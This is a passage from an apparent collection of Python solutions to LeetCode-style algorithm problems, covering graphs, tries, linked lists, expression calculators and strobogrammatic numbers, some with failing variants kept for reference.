return cnt
def dfs(self, grid, i, j, visited):
m = len(grid)
n = len(grid[0])
visited[i][j] = True
for dir in self.dirs:
I = i+dir[0]
J = j+dir[1]
if 0 <= I < m and 0 <= J < n and not visited[I][J] and grid[I][J] == "1":
self.dfs(grid, I, J, visited)
if __name__ == "__main__":
assert Solution().numIslands(["1", "1"]) == 1
class Solution:
def rangeBitwiseAnd(self, m, n):
pos = 0
while m != n:
pos += 1
m >>= 1
n >>= 1
return n << pos
class Solution:
def isHappy(self, n):
nxt = 0
appeared = set()
while True:
nxt += (n%10)*(n%10)
n /= 10
if n == 0:
if nxt == 1:
return True
if nxt in appeared:
return False
appeared.add(nxt)
n = nxt
nxt = 0
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
class Solution:
def removeElements(self, head, val):
dummy = ListNode(0)
dummy.next = head
pre = dummy
while pre.next:
cur = pre.next
if cur.val == val:
pre.next = cur.next
continue
pre = pre.next
return dummy.next
import math
class Solution:
def countPrimes(self, n):
if n < 3:
return 0
is_prime = [True for _ in xrange(n)]
is_prime[0], is_prime[1] = False, False
for i in xrange(2, int(math.sqrt(n))+1):
if is_prime[i]:
for j in xrange(i*i, n, i):
is_prime[j] = False
return is_prime.count(True)
if __name__ == "__main__":
assert Solution().countPrimes(1500000) == 114155
class Solution:
def isIsomorphic(self, s, t):
m = {}
mapped = set()
for i in xrange(len(s)):
if s[i] not in m and t[i] not in mapped:
m[s[i]] = t[i]
mapped.add(t[i])
elif s[i] in m and m[s[i]] == t[i]:
pass
else:
return False
return True
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
class Solution:
def reverseList(self, head: ListNode) -> ListNode:
prev = None
cur = head
while cur:
nxt = cur.next
cur.next = prev
prev = cur
cur = nxt
return prev
def reverseList_complex(self, head: ListNode) -> ListNode:
if not head:
return None
prev = head
cur = head.next
head.next = None
while prev and cur:
nxt = cur.next
cur.next = prev
prev = cur
cur = nxt
return prev
class ListNode(object):
def __init__(self, x):
self.val = x
self.next = None
class Solution(object):
def reverseList(self, head):
if not head:
return head
dummy = ListNode(0)
dummy.next = head
pre = dummy
cur = pre.next
while pre and cur:
pre, cur.next, cur = cur, pre, cur.next
dummy.next.next = None
return pre
class Solution:
def canFinish(self, numCourses, prerequisites):
V = [[] for _ in xrange(numCourses)]
for edge in prerequisites:
V[edge[0]].append(edge[1])
visited = [False for _ in xrange(numCourses)]
marked = [False for _ in xrange(numCourses)]
for i in xrange(numCourses):
if not visited[i]:
if self.dfs_have_cycle(V, i, visited, marked):
return False
return True
def dfs_have_cycle(self, V, i, visited, marked):
if marked[i]:
return True
marked[i] = True
for neighbor in V[i]:
if not visited[neighbor] and self.dfs_have_cycle(V, neighbor, visited, marked):
return True
marked[i] = False
visited[i] = True
return False
if __name__ == "__main__":
assert Solution().canFinish(2, [[1, 0], [0, 1]]) is False
class TrieNode:
def __init__(self):
self.ended = False
self.children = {}
class Trie:
def __init__(self):
self.root = TrieNode()
def insert(self, word):
cur = self.root
for w in word:
if w not in cur.children:
cur.children[w] = TrieNode()
cur = cur.children[w]
cur.ended = True
def search(self, word):
cur = self.root
for w in word:
if w in cur.children:
cur = cur.children[w]
else:
return False
if not cur.ended:
return False
return True
def startsWith(self, prefix):
cur = self.root
for w in prefix:
if w in cur.children:
cur = cur.children[w]
else:
return False
return True
import sys
class Solution:
def minSubArrayLen(self, s, nums):
n = len(nums)
S = [0 for _ in xrange(n+1)]
for i in xrange(1, n+1):
S[i] = S[i-1]+nums[i-1]
lo, hi = 0, 1
mini = sys.maxint
while hi <= n:
if S[hi]-S[lo] >= s:
mini = min(mini, hi-lo)
lo += 1
else:
hi += 1
return mini if mini != sys.maxint else 0
if __name__ == "__main__":
assert Solution().minSubArrayLen(7, [2, 3, 1, 2, 4, 3]) == 2
class Solution:
def findOrder(self, numCourses, prerequisites):
V = {}
for i in xrange(numCourses):
V[i] = []
for edge in prerequisites:
V[edge[1]].append(edge[0])
return self.topological_sort(V)
def topological_sort(self, V):
visited = set()
marked = set()
ret = []
for k in V.keys():
if k not in visited:
if not self.dfs(V, k, visited, marked, ret):
return []
ret.reverse()
return ret
def dfs(self, V, k, visited, marked, ret):
if k in marked:
return False
marked.add(k)
for neighbor in V[k]:
if neighbor not in visited:
if not self.dfs(V, neighbor, visited, marked, ret):
return False
marked.remove(k)
visited.add(k)
ret.append(k)
return True
if __name__ == "__main__":
assert Solution().findOrder(2, [[0, 1], [1, 0]]) == []
class TrieNode:
def __init__(self):
self.ended = False
self.children = {}
class WordDictionary:
def __init__(self):
self.root = TrieNode()
def addWord(self, word):
cur = self.root
for w in word:
if w not in cur.children:
cur.children[w] = TrieNode()
cur = cur.children[w]
cur.ended = True
def search(self, word):
return self.__search(word, self.root)
def __search(self, word, cur):
if not word:
return cur.ended
w = word[0]
if w != ".":
if w in cur.children:
return self.__search(word[1:], cur.children[w])
else:
return False
else:
for child in cur.children.values():
if self.__search(word[1:], child):
return True
return False
if __name__ == "__main__":
dic = WordDictionary()
dic.addWord("a")
assert dic.search(".") == True
from typing import List
from collections import defaultdict
dirs = [(0, 1), (0, -1), (-1, 0), (1, 0)]
class TrieNode:
def __init__(self):
self.word = None
self.children = defaultdict(TrieNode)
class Solution:
def findWords(self, board: List[List[str]], words: List[str]) -> List[str]:
root = self.construct(words)
m, n = len(board), len(board[0])
visited = [[False for _ in range(n)] for _ in range(m)]
ret = set()
for i in range(m):
for j in range(n):
self.dfs(board, visited, i, j, root, ret)
return list(ret)
def dfs(self, board, visited, i, j, cur, ret):
m, n = len(board), len(board[0])
visited[i][j] = True
c = board[i][j]
if c in cur.children:
nxt = cur.children[c]
if nxt.word is not None:
ret.add(nxt.word)
for di, dj in dirs:
I = i + di
J = j + dj
if 0 <= I < m and 0 <= J < n and not visited[I][J]:
self.dfs(board, visited, I, J, nxt, ret)
visited[i][j] = False
def construct(self, words):
root = TrieNode()
for w in words:
cur = root
for c in w:
cur = cur.children[c]
cur.word = w
return root
class TrieNode(object):
def __init__(self, char):
self.char = char
self.word = None
self.children = {}
def __repr__(self):
return repr(self.char)
class Trie(object):
def __init__(self):
self.root = TrieNode(None)
def add(self, word):
word = word.lower()
cur = self.root
for c in word:
if c not in cur.children:
cur.children[c] = TrieNode(c)
cur = cur.children[c]
cur.word = word
class Solution:
def __init__(self):
self.dirs = [(0, 1), (0, -1), (-1, 0), (1, 0)]
def findWords(self, board, words):
trie = Trie()
for word in words:
trie.add(word)
ret = set()
marked = set()
for i in xrange(len(board)):
for j in xrange(len(board[0])):
self.dfs(board, i, j, trie.root, marked, ret)
return list(ret)
def dfs(self, board, i, j, parent, marked, ret):
m = len(board)
n = len(board[0])
marked.add((i, j))
c = board[i][j]
if c in parent.children:
cur = parent.children[c]
if cur.word:
ret.add(cur.word)
for dir in self.dirs:
row = i+dir[0]
col = j+dir[1]
if 0 <= row < m and 0 <= col < n and (row, col) not in marked:
self.dfs(board, row, col, cur, marked, ret)
marked.remove((i, j))
class Solution:
def rob(self, nums):
n = len(nums)
if n < 2:
return sum(nums)
F = [0 for _ in xrange(n-1+2)]
for i in xrange(2, n+1):
F[i] = max(F[i-1], F[i-2]+nums[i-2])
ret = F[-1]
F = [0 for _ in xrange(n-1+2)]
for i in xrange(2, n+1):
F[i] = max(F[i-1], F[i-2]+nums[i-1])
ret = max(ret, F[-1])
return ret
class Solution:
def shortestPalindrome(self, s):
s_r = s[::-1]
l = len(s)
if l < 2:
return s
T = [0 for _ in xrange(l+1)]
T[0] = -1
pos = 2
cnd = 0
while pos <= l:
if s[pos-1] == s[cnd]:
T[pos] = cnd+1
cnd += 1
pos += 1
elif T[cnd] != -1:
cnd = T[cnd]
else:
T[pos] = 0
cnd = 0
pos += 1
i = 0
b = 0
while i+b < l:
if s[i] == s_r[i+b]:
i += 1
if i == l:
return s
elif T[i] != -1:
b = b+i-T[i]
i = T[i]
else:
b += 1
i = 0
return s_r+s[i:]
if __name__ == "__main__":
assert Solution().shortestPalindrome("abcd") == "dcbabcd"
import heapq
class Solution:
def findKthLargest(self, nums, k):
h = []
n = len(nums)
for i, v in enumerate(nums):
if i < k:
heapq.heappush(h, v)
else:
if v <= h[0]:
continue
heapq.heappop(h)
heapq.heappush(h, v)
return heapq.heappop(h)
if __name__ == "__main__":
print Solution().findKthLargest([3, 2, 1, 5, 6, 4], 2)
class Solution:
def combinationSum3(self, k, n):
ret = []
self.dfs(k, n, [], ret)
return ret
def dfs(self, remain_k, remain_n, cur, ret):
if remain_k == 0 and remain_n == 0:
ret.append(list(cur))
return
if remain_k * 9 < remain_n or remain_k * 1 > remain_n:
return
start = 1
if cur:
start = cur[-1] + 1
for i in xrange(start, 10):
cur.append(i)
self.dfs(remain_k - 1, remain_n - i, cur, ret)
cur.pop()
if __name__ == "__main__":
assert Solution().combinationSum3(3, 9) == [[1, 2, 6], [1, 3, 5], [2, 3, 4]]
from collections import Counter
class Solution:
def containsDuplicate(self, nums):
d = Counter(nums)
for k, v in d.items():
if v > 1:
return True
return False
from collections import defaultdict, namedtuple
import heapq
class Building(object):
def __init__(self, h):
self.h = h
self.deleted = False
def __cmp__(self, other):
assert isinstance(other, Building)
return other.h - self.h
Event = namedtuple('Event', 'starts ends')
class Solution:
def getSkyline(self, buildings):
events = defaultdict(lambda: Event(starts=[], ends=[]))
for left, right, height in buildings:
building = Building(height)
events[left].starts.append(building)
events[right].ends.append(building)
heap_h = []
cur_h = 0
ret = []
for x, event in sorted(events.items()):
for building in event.starts:
heapq.heappush(heap_h, building)
for building in event.ends:
building.deleted = True
while heap_h and heap_h[0].deleted:
heapq.heappop(heap_h)
new_h = heap_h[0].h if heap_h else 0
if new_h != cur_h:
cur_h = new_h
ret.append([x, cur_h])
return ret
if __name__ == "__main__":
assert Solution().getSkyline([[2, 9, 10], [3, 7, 15], [5, 12, 12], [15, 20, 10], [19, 24, 8]]) == \
[[2, 10], [3, 15], [7, 12], [12, 0], [15, 10], [20, 8], [24, 0]]
import heapq
from collections import defaultdict
class Solution:
def containsNearbyDuplicate(self, nums, k):
d = defaultdict(list)
for i, v in enumerate(nums):
heapq.heappush(d[v], i)
for v in d.values():
if len(v) > 1:
pre = heapq.heappop(v)
while v:
cur = heapq.heappop(v)
if cur-pre <= k:
return True
pre = cur
return False
from collections import OrderedDict
class Solution:
def containsNearbyAlmostDuplicate(self, nums, k, t):
if k < 1 or t < 0:
return False
if t == 0:
return self.containsNearByDuplicate(nums, k)
od = OrderedDict()
for n in nums:
key = n/t
for j in (-1, 0, 1):
m = od.get(key+j)
if m is not None and abs(m-n) <= t:
return True
while len(od) >= k:
od.popitem(False)
od[key] = n
return False
def containsNearByDuplicate(self, nums, k):
od = OrderedDict()
for n in nums:
if od.get(n):
return True
while len(od) >= k:
od.popitem(False)
od[n] = n
return False
if __name__ == "__main__":
print Solution().containsNearbyAlmostDuplicate([-3, 3], 2, 4)
class Solution:
def maximalSquare(self, matrix):
m = len(matrix)
if m < 1: return 0
n = len(matrix[0])
if n < 1: return 0
for i in xrange(m):
matrix[i] = map(int, matrix[i])
maxa = 0
to_top = [[0 for _ in xrange(n+1)] for _ in xrange(m+1)]
to_left = [[0 for _ in xrange(n+1)] for _ in xrange(m+1)]
square_width = [[0 for _ in xrange(n+1)] for _ in xrange(m+1)]
for i in xrange(1, m+1):
for j in xrange(1, n+1):
if matrix[i-1][j-1] == 0:
continue
to_top[i][j] += to_top[i-1][j] + matrix[i-1][j-1]
to_left[i][j] += to_left[i][j-1] + matrix[i-1][j-1]
square_width[i][j] = min(
square_width[i-1][j-1]+1,
to_left[i][j],
to_top[i][j],
)
maxa = max(maxa, square_width[i][j])
return maxa*maxa
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
def __repr__(self):
return repr(self.val)
class Solution:
def countNodes(self, root):
if not root:
return 0
h = self.get_height(root)
h_r = self.get_height(root.right)
if h == h_r+1:
return 2**(h-1)-1+1+self.countNodes(root.right)
else:
return 2**(h-2)-1+1+self.countNodes(root.left)
def get_height(self, cur):
h = 0
while cur:
h += 1
cur = cur.left
return h
class Solution_TLE:
def __init__(self):
self.depth = 0
self.cnt = 0
self.stopped = False
def countNodes(self, root):
if not root:
return 0
self.get_depth(root)
self.fanthom(root, 1)
return 2**(self.depth-1)-1+self.cnt
def get_depth(self, root):
self.depth += 1
if root.left:
self.get_depth(root.left)
def fanthom(self, root, depth):
if self.stopped:
return
if not root.left and not root.left:
if self.depth == depth:
self.cnt += 1
else:
self.stopped = True
return
if root.left:
self.fanthom(root.left, depth+1)
if root.right:
self.fanthom(root.right, depth+1)
def countNodes_TLE(self, root):
if not root:
return 0
return 1+self.countNodes(root.left)+self.countNodes(root.right)
if __name__ == "__main__":
pass
class Solution:
def computeArea(self, A, B, C, D, E, F, G, H):
S_A = (C-A)*(D-B)
S_B = (G-E)*(H-F)
l = max(0, min(C, G)-max(A, E))
h = max(0, min(D, H)-max(B, F))
return S_A + S_B - l*h
if __name__ == "__main__":
assert Solution().computeArea(-2, -2, 2, 2, -2, -2, 2, 2) == 16
from typing import List
class Solution:
def calculate(self, s: str) -> int:
ret, _ = self.eval(s + "\0", 0, [])
return ret
def eval(self, s: str, start: int, stk: List[int]) -> int:
prev_op = "+"
operand = 0
i = start
while i < len(s):
if s[i] == " ":
pass
elif s[i].isdigit():
operand = operand * 10 + int(s[i])
elif s[i] in ("+", "-", ")", "\0"):
if prev_op == "+":
stk.append(operand)
elif prev_op == "-":
stk.append(-operand)
if s[i] in ("+", "-"):
operand = 0
prev_op = s[i]
elif s[i] in (")", "\0"):
return sum(stk), i
elif s[i] == "(":
operand, i = self.eval(s, i + 1, [])
else:
raise
i += 1
if __name__ == "__main__":
assert Solution().calculate("(1+(4+5+2)-3)+(6+8)") == 23
class Solution:
def calculate(self, s):
lst = self.to_list(s)
postfix = self.infix2postfix(lst)
return self.eval_postfix(postfix)
def to_list(self, s):
i = 0
ret = []
while i < len(s):
if s[i] == " ":
i += 1
elif s[i] in ("(", ")", "+", "-"):
ret.append(s[i])
i += 1
else:
b = i
while i < len(s) and s[i].isdigit():
i += 1
ret.append(s[b:i])
return ret
def infix2postfix(self, lst):
stk = []
ret = []
for elt in lst:
if elt.isdigit():
ret.append(elt)
elif elt == "(":
stk.append(elt)
elif elt == ")":
while stk[-1] != "(":
ret.append(stk.pop())
stk.pop()
else:
while stk and self.precendece(elt) <= self.precendece(stk[-1]):
ret.append(stk.pop())
stk.append(elt)
while stk:
ret.append(stk.pop())
return ret
def precendece(self, op):
if op in ("(", ")"):
return 0
if op in ("+", "-"):
return 1
def eval_postfix(self, post):
stk = []
for elt in post:
if elt in ("+", "-"):
b = int(stk.pop())
a = int(stk.pop())
if elt == "+":
stk.append(a+b)
else:
stk.append(a-b)
else:
stk.append(elt)
assert len(stk) == 1
return int(stk[-1])
if __name__ == "__main__":
assert Solution().calculate(" 2-1 + 2 ") == 3
assert Solution().calculate("(1+(4+5+2)-3)+(6+8)") == 23
class Stack:
def __init__(self):
self.q = [[], []]
def push(self, x):
t = 0
if not self.q[t]:
t ^= 1
self.q[t].append(x)
def pop(self):
t = 0
if not self.q[t]:
t ^= 1
while len(self.q[t]) > 1:
self.q[t^1].append(self.q[t].pop(0))
return self.q[t].pop()
def top(self):
popped = self.pop()
t = 0
if not self.q[t]:
t ^= 1
self.q[t].append(popped)
return popped
def empty(self):
return not self.q[0] and not self.q[1]
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def invertTree_recur(self, root):
if not root:
return None
self.invertTree_recur(root.left)
self.invertTree_recur(root.right)
root.left, root.right = root.right, root.left
return root
def invertTree(self, root):
if not root:
return None
stk = []
post = []
stk.append(root)
cur = None
while stk:
cur = stk.pop()
post.append(cur)
if cur.left:
stk.append(cur.left)
if cur.right:
stk.append(cur.right)
while post:
cur = post.pop()
cur.left, cur.right = cur.right, cur.left
return cur
class Solution:
def calculate(self, s: str) -> int:
operand = 0
stk = []
prev_op = "+"
for i, c in enumerate(s):
if c.isdigit():
operand = operand * 10 + int(c)
delimited = c in ("+", "-", "*", "/") or i == len(s) - 1
if delimited:
if prev_op == "+":
cur = operand
elif prev_op == "-":
cur = -operand
elif prev_op == "*":
cur = stk.pop() * operand
else:
assert prev_op == "/"
cur = int(stk.pop() / operand)
stk.append(cur)
prev_op = c
operand = 0
return sum(stk)
def calculate_error(self, s: str) -> int:
operand = 0
stk = []
prev_op = "+"
for i, c in enumerate(s):
if c.isdigit():
operand = operand * 10 + int(c)
delimited = c in ("+", "-", "*", "/") or i == len(s) - 1
if delimited:
cur = {
"+": operand,
"-": -operand,
"*": stk.pop() * operand,
"/": int(stk.pop() / operand),
}[prev_op]
stk.append(cur)
prev_op = c
operand = 0
return sum(stk)
if __name__ == "__main__":
assert Solution().calculate("3+2*2") == 7
class Solution:
def calculate(self, s):
lst = self.parse(s)
post = self.infix2postfix(lst)
return self.eval_postfix(post)
def parse(self, s):
i = 0
ret = []
while i < len(s):
if s[i] == " ":
i += 1
elif s[i] in ("(", ")", "+", "-", "*", "/"):
ret.append(s[i])
i += 1
else:
b = i
while i < len(s) and s[i].isdigit():
i += 1
ret.append(s[b:i])
return ret
def infix2postfix(self, lst):
stk = []
ret = []
for elt in lst:
if elt.isdigit():
ret.append(elt)
elif elt == "(":
stk.append(elt)
elif elt == ")":
while stk[-1] != "(":
ret.append(stk.pop())
stk.pop()
else:
while stk and self.precendece(elt) <= self.precendece(stk[-1]):
ret.append(stk.pop())
stk.append(elt)
while stk:
ret.append(stk.pop())
return ret
def precendece(self, op):
if op in ("(", ")"):
return 0
if op in ("+", "-"):
return 1
if op in ("*", "/"):
return 2
return 3
def eval_postfix(self, post):
stk = []
for elt in post:
if elt in ("+", "-", "*", "/"):
b = int(stk.pop())
a = int(stk.pop())
if elt == "+":
stk.append(a+b)
elif elt == "-":
stk.append(a-b)
elif elt == "*":
stk.append(a*b)
else:
stk.append(a/b)
else:
stk.append(elt)
assert len(stk) == 1
return int(stk[-1])
if __name__ == "__main__":
assert Solution().calculate("3+2*2") == 7
class Solution:
def summaryRanges(self, nums):
ret = []
n = len(nums)
if n < 1:
return ret
bgn = nums[0]
pre = nums[0]
for i in xrange(1, n):
if nums[i] != pre+1:
if pre != bgn:
ret.append("%d->%d"%(bgn, pre))
else:
ret.append("%d"%bgn)
bgn = nums[i]
pre = nums[i]
if pre != bgn:
ret.append("%d->%d"%(bgn, pre))
else:
ret.append("%d"%bgn)
return ret
if __name__ == "__main__":
assert Solution().summaryRanges([0, 1, 2, 4, 5, 7]) == ['0->2', '4->5', '7']
from collections import defaultdict
class Solution:
def majorityElement(self, nums):
cnt = defaultdict(int)
for num in nums:
if num in cnt:
cnt[num] += 1
else:
if len(cnt) < 3-1:
cnt[num] += 1
else:
for k in cnt.keys():
cnt[k] -= 1
if cnt[k] == 0:
del cnt[k]
ret = []
for k in cnt.keys():
if len(filter(lambda x: x == k, nums)) > len(nums)/2:
ret.append(k)
return ret
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def kthSmallest(self, root, k):
l = self.cnt(root.left)
if l+1 == k:
return root.val
elif l+1 < k:
return self.kthSmallest(root.right, k-(l+1))
else:
return self.kthSmallest(root.left, k)
def cnt(self, root):
if not root:
return 0
return 1+self.cnt(root.left)+self.cnt(root.right)
class Solution:
def isPowerOfTwo(self, n):
if n <= 0:
return False
return n & (n-1) == 0
class Queue:
def __init__(self):
self.in_stk = []
self.out_stk = []
def push(self, x):
self.in_stk.append(x)
def pop(self):
if not self.out_stk:
while self.in_stk:
self.out_stk.append(self.in_stk.pop())
self.out_stk.pop()
def peek(self):
if not self.out_stk:
while self.in_stk:
self.out_stk.append(self.in_stk.pop())
return self.out_stk[-1]
def empty(self):
return not self.out_stk and not self.in_stk
class Solution:
def countDigitOne(self, n):
if n < 1:
return 0
cnt = 0
sig = 1
while n/sig:
temp = sig*10
cur_digit = (n/sig)%10
hi_digit = n/temp
lo_digit = n%sig
if cur_digit > 1:
cnt += (hi_digit+1)*sig
elif cur_digit == 1:
cnt += hi_digit*sig + (lo_digit+1)
else:
cnt += hi_digit*sig
sig = temp
return cnt
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
class Solution:
def isPalindrome(self, head):
n = self.len(head)
m = n/2
mid = self.get(head, m)
if n%2 != 0:
mid = mid.next
mid = self.reverse(mid)
while head and mid:
if head.val != mid.val:
return False
head = head.next
mid = mid.next
return True
def len(self, head):
cnt = 0
cur = head
while cur:
cnt += 1
cur = cur.next
return cnt
def get(self, head, n):
cnt = 0
cur = head
while cnt < n:
cnt += 1
cur = cur.next
return cur
def reverse(self, head):
if not head:
return head
dummy = ListNode(0)
dummy.next = head
pre, cur = dummy, dummy.next
while cur:
nxt = cur.next
cur.next = pre
pre, cur = cur, nxt
if head: head.next = None
return pre
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def lowestCommonAncestor(self, root: TreeNode, p: TreeNode, q: TreeNode) -> TreeNode:
return self.walk(root, p, q)
def walk(self, node, p, q):
if p.val > node.val and q.val > node.val:
return self.walk(node.right, p, q)
if p.val < node.val and q.val < node.val:
return self.walk(node.left, p, q)
return node
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def lowestCommonAncestor(self, root, p, q):
cur = root
while True:
if p.val < cur.val and q.val < cur.val:
cur = cur.left
elif p.val > cur.val and q.val > cur.val:
cur = cur.right
else:
return cur
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def __init__(self):
self.ans = None
def lowestCommonAncestor(self, root: TreeNode, p: TreeNode, q: TreeNode) -> TreeNode:
self.count(root, p, q)
return self.ans
def count(self, node, p, q):
if not node:
return 0
lcount = self.count(node.left, p, q)
rcount = self.count(node.right, p, q)
mcount = 1 if node == p or node == q else 0
ret = lcount + rcount + mcount
if lcount == 1 and rcount == 1 or lcount == 1 and mcount == 1 or rcount == 1 and mcount == 1:
self.ans = node
return ret
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def lowestCommonAncestor(self, root, p, q):
path1, path2 = [], []
self.dfs(root, p, path1, [False])
self.dfs(root, q, path2, [False])
i = 0
while i < min(len(path1), len(path2)):
if path1[i] != path2[i]:
return path1[i-1]
i += 1
return path1[i-1]
def dfs(self, root, t, path, found):
if not root or found[0]:
return
path.append(root)
if root == t:
found[0] = True
self.dfs(root.left, t, path, found)
self.dfs(root.right, t, path, found)
if not found[0]:
path.pop()
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
class Solution:
def deleteNode(self, node):
cur = node
while cur.next:
cur.val = cur.next.val
if not cur.next.next:
cur.next = None
break
cur = cur.next
class Solution:
def productExceptSelf(self, nums):
n = len(nums)
left = [1 for _ in xrange(n+1)]
right = [1 for _ in xrange(n+1)]
for i in xrange(1, n+1):
left[i] = left[i-1]*nums[i-1]
for i in xrange(n-1, -1, -1):
right[i] = right[i+1]*nums[i]
return [left[i]*right[i+1] for i in xrange(n)]
class Solution:
def maxSlidingWindow(self, nums, k):
q = []
ret = []
n = len(nums)
for i in xrange(n):
while q and q[0] <= i-k:
q.pop(0)
while q and nums[q[-1]] < nums[i]:
q.pop()
q.append(i)
if i >= k-1:
ret.append(nums[q[0]])
return ret
class Solution(object):
def searchMatrix(self, mat, target):
m = len(mat)
n = len(mat[0])
i = 0
j = n-1
while i < m and 0 <= j:
if mat[i][j] == target:
return True
elif mat[i][j] > target:
j -= 1
else:
i += 1
return False
class SolutionBinSearch(object):
def searchMatrix(self, mat, target):
m = len(mat)
n = len(mat[0])
col = [mat[i][0] for i in xrange(m)]
row_by_first = self.bin_search(col, target)
col = [mat[i][-1] for i in xrange(m)]
row_by_last = self.bin_search(col, target, False)
for i in range(row_by_first, row_by_last-1, -1):
col = self.bin_search(mat[i], target)
if mat[i][col] == target:
return True
return False
def bin_search(self, A, t, lower=True):
lo = 0
hi = len(A)
while lo < hi:
mid = (lo+hi)/2
if A[mid] == t:
return mid
elif A[mid] < t:
lo = mid+1
else:
hi = mid
if lower:
return lo-1
else:
return lo
if __name__ == "__main__":
assert Solution().searchMatrix([[1, 4], [2, 5]], 4) == True
assert SolutionBinSearch().searchMatrix([[1, 4], [2, 5]], 4) == True
import re
class Solution:
def diffWaysToCompute(self, input):
input_lst = re.split(r"(\D)", input)
nums = map(int, filter(lambda x: re.match(r"\d+", x), input_lst))
ops = filter(lambda x: re.match(r"\D", x), input_lst)
ret = self.dfs_eval(nums, ops)
return ret
def dfs_eval(self, nums, ops):
ret = []
if not ops:
assert len(nums) == 1
return nums
for i, op in enumerate(ops):
left_vals = self.dfs_eval(nums[:i+1], ops[:i])
right_vals = self.dfs_eval(nums[i+1:], ops[i+1:])
for l in left_vals:
for r in right_vals:
ret.append(self._eval(l, r, op))
return ret
def _eval(self, a, b, op):
return {
"+": lambda a, b: a+b,
"-": lambda a, b: a-b,
"*": lambda a, b: a*b,
}[op](a, b)
if __name__ == "__main__":
assert Solution().diffWaysToCompute("1+1") == [2]
from collections import defaultdict
class Solution:
def isAnagram(self, s, t):
cnt = defaultdict(int)
for c in s:
cnt[c] += 1
for c in t:
if c not in cnt or cnt[c] < 1:
return False
cnt[c] -= 1
for v in cnt.values():
if v != 0:
return False
return True
import sys
from bisect import bisect_left
class Solution:
def shortestDistance(self, words, word1, word2):
lst1 = [i for i, v in enumerate(words) if v == word1]
lst2 = [i for i, v in enumerate(words) if v == word2]
mini = sys.maxint
for i in lst1:
idx = bisect_left(lst2, i)
for nei in (-1, 0):
if 0 <= idx+nei < len(lst2):
mini = min(mini, abs(i-lst2[idx+nei]))
return mini
from bisect import bisect_left
from collections import defaultdict
import sys
class WordDistance(object):
def __init__(self, words):
self.word_dict = defaultdict(list)
for i, w in enumerate(words):
self.word_dict[w].append(i)
def shortest(self, word1, word2):
mini = sys.maxint
for i in self.word_dict[word1]:
idx = bisect_left(self.word_dict[word2], i)
for nei in (-1, 0):
if 0 <= idx+nei < len(self.word_dict[word2]):
mini = min(mini, abs(i-self.word_dict[word2][idx+nei]))
return mini
import sys
from bisect import bisect_left
class Solution(object):
def shortestWordDistance(self, words, word1, word2):
pos_lst1 = [pos for pos, v in enumerate(words) if v == word1]
pos_lst2 = [pos for pos, v in enumerate(words) if v == word2]
mini = sys.maxint
for pos in pos_lst1:
idx = bisect_left(pos_lst2, pos)
for nei in (-1, 0):
if 0 <= idx+nei < len(pos_lst2) and pos != pos_lst2[idx+nei]:
mini = min(mini, abs(pos-pos_lst2[idx+nei]))
return mini
class Solution:
def __init__(self):
self.map = {
"1": "1",
"6": "9",
"9": "6",
"8": "8",
"0": "0"
}
def isStrobogrammatic(self, num):
for i in xrange(len(num)/2+1):
if num[i] not in self.map or self.map[num[i]] != num[len(num)-1-i]:
return False
return True
def isStrobogrammatic_tedious(self, num):
num = list(num)
rev = []
for digit in reversed(num):
try:
rev.append(self.map[digit])
except KeyError:
return False
return num == rev
from collections import deque
class Solution(object):
def __init__(self):
self.lst = ["11", "69", "88", "96", "00"]
self.middle = ["0", "1", "8"]
def findStrobogrammatic(self, n):
ret = []
self.build(n, deque(), ret)
return ret
def build(self, n, cur, ret):
if n%2 == 1 and len(cur) == 0:
for elt in self.middle:
cur.append(elt)
self.build(n, cur, ret)
cur.pop()
else:
if len(cur) == n:
ret.append("".join(cur))
return
for elt in self.lst:
if not (elt == "00" and len(cur) == n-2):
cur.appendleft(elt[0])
cur.append(elt[1])
self.build(n, cur, ret)
cur.pop()
cur.popleft()
class SolutionArray(object):
def __init__(self):
self.map1 = ["11", "69", "88", "96", "00"]
def findStrobogrammatic(self, n):
ret = []
self.build(n, [], ret)
return ret
def build(self, n, cur, ret):
if n%2 == 1 and len(cur) == 0:
for i in ["0", "1", "8"]:
cur.append(i)
self.build(n, cur, ret)
cur.pop()
return
if len(cur)/2 == n/2:
ret.append("".join(cur))
return
for elt in self.map1:
if elt != "00" or len(cur) != n-2:
cur.insert(0, elt[0])
cur.append(elt[1])
self.build(n, cur, ret)
cur.pop()
cur.pop(0)
class SolutionOutputLimitExceeded(object):
def __init__(self):
self.map = {
"1": "1",
"6": "9",
"9": "6",
"8": "8",
"0": "0"
}
self.middle = ["1", "8", "0"]
def findStrobogrammatic(self, n):
ret = []
self.build(0, n, [], ret)
return ret
def build(self, idx, n, cur, ret):
if idx == n/2:
if n % 2 != 0:
for m in self.middle:
if m != "0" or idx != 0:
temp = list(cur)
temp.append(m)
for i in xrange(idx-1, -1, -1):
temp.append(self.map[temp[i]])
ret.append("".join(temp))
else:
temp = list(cur)
for i in xrange(idx-1, -1, -1):
temp.append(self.map[temp[i]])
ret.append("".join(temp))
return
for k in self.map.keys():
if k != "0" or idx != 0:
cur.append(k)
self.build(idx+1, n, cur, ret)
cur.pop()
if __name__ == "__main__":
assert Solution().findStrobogrammatic(3) == ['101', '609', '808', '906', '111', '619', '818', '916', '181', '689', '888', '986']
from collections import deque
class Solution(object):
def __init__(self):
self.lst = ["11", "69", "88", "96", "00"]
self.middle = ["0", "1", "8"]
def strobogrammaticInRange(self, low, high):
cnt = 0
for l in xrange(len(low), len(high)+1):
cnt += len(filter(lambda x: int(low) <= int(x) <= int(high), self.strobogrammatic(l)))
return cnt
def strobogrammatic(self, n):
ret = []
self.build(n, deque(), ret)
return ret
def build(self, n, cur, ret):
if n%2 == 1 and len(cur) == 0:
for elt in self.middle:
cur.append(elt)
self.build(n, cur, ret)
cur.pop()
else:
if len(cur) == n:
ret.append("".join(cur))
return
for elt in self.lst:
if not (elt == "00" and len(cur) == n-2):
cur.appendleft(elt[0])
cur.append(elt[1])
self.build(n, cur, ret)
cur.pop()
cur.popleft()
from collections import defaultdict
class Solution:
